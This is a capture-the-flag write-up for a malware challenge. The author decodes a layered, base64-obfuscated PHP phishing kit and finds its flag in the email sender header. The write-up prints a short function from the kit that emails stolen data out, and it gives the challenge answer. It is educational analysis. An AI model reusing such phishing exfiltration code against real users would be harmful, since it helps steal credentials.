# For Greatness

| Category   | Author       |
| ---------- | ------------ |
| 🐞 Malware | John Hammond |

> Oh great, another phishing kit. This has some functionality to even send stolen data over email! Can you track down the email address they send things to?

> **CAUTION**
> 
> This is the Malware category, and as such, includes malware. Please be sure to analyze these files within an isolated virtual machine.

> The password to the archive is `infected`. Uncover the flag from the file provided.

Export zip, contains php file with encoded text

Decoding this gives us another PHP file with a compressed file included.

Decompressing that we get another base64 file.

Decoding that file, we arrive at what is like the PHP server of a C2 server.

Got distracted by base64 encoded images and tried to grab all of these but they were logos of Microsoft and Cortana(?).

The hint is to try and find the email address. So searched for "mail"

```
public function mailTo($add,$cont){
		$subject='++++Office Email From Greatness+++++';
		$headers='Content-type: text/html; charset=UTF-8' . "\r\nFrom: Greatness <ghost+}f7113307018770d52d4f94fec013197f{galf@greatness.com>" . "\r\n";
		@mail($add,$subject,$cont,$headers);
	}
```

Reversing `}f7113307018770d52d4f94fec013197f{galf` we get `flag{f791310cef49f4d25d0778107033117f}`